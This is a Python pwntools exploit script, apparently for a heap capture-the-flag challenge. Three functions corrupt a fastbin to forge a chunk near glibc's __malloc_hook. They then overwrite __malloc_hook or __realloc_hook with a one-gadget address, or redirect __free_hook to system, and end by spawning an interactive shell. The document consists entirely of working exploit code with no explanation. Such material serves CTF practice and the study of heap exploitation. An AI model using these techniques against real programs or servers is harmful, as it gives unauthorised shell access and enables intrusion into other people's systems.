# __malloc_hook
def pwn():
	alloc(0x60)					# chunk4
	free(4)

	malloc_hook = libc_base + libc.symbols['__malloc_hook']
	fill(2, malloc_hook - 0x20 + 0xd)

	alloc(0x60)					# chunk4
	alloc(0x60)					# chunk6 (fake chunk)
	one_gadget = libc_base + 0x4526a
	fill(6, p8(0)*3 + p64(one_gadget))		# __malloc_hook => one-gadget

	alloc(1)
	io.interactive()

# __realloc_hook
def pwn2():
	alloc(0x60)					# chunk4
	free(4)

	malloc_hook = libc_base + libc.symbols['__malloc_hook']
	libc_realloc = libc_base + libc.symbols['__libc_realloc']
	fill(2, p64(malloc_hook - 0x30 + 0xd))

	alloc(0x60)					# chunk4
	alloc(0x60)					# chunk6 (fake chunk)

	one_gadget = libc_base + 0xf1147
	payload  = p8(0) * (0x13 - 8)
	payload += p64(one_gadget)			# __realloc_hook => one-gadget
	payload += p64(libc_realloc + 2)		# __malloc_hook => __libc_realloc
	fill(6, payload)

	alloc(1)
	io.interactive()

# __free_hook
def pwn3():
	alloc(0x60)					# chunk4
	free(4)

	malloc_hook = libc_base + libc.symbols['__malloc_hook']
	free_hook = libc_base + libc.symbols['__free_hook']
	system_addr = libc_base + libc.symbols['system']
	fill(2, p64(malloc_hook - 0x30 + 0xd))

	alloc(0x60)					# chunk4
	alloc(0x60)					# chunk6 (fake chunk)
	fill(6, p8(0)*3 + p64(0)*15 + p64(free_hook - 0xb58))

	alloc(0xb30)					# chunk7
	fill(7, '/bin/sh')
	alloc(0x20)					# chunk8
	fill(8, p64(0) + p64(system_addr))

	free(7)
	io.interactive()
